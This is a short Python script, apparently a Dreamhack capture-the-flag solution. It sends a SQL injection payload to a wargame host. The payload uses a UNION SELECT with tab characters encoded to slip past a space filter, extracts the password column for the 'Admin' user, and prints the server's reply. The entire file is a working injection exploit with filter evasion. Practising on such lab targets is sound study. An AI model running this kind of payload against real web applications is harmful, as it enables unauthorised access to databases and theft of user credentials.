import requests

BASE_URL = "http://host3.dreamhack.games:13971/?uid="

query = "'UNION%09SELECT%091,upw,1%09FROM%09user%09WHERE%09uid='Admin'%23"
query = BASE_URL + query
print(query)
res = requests.get(query)

print(res.text)
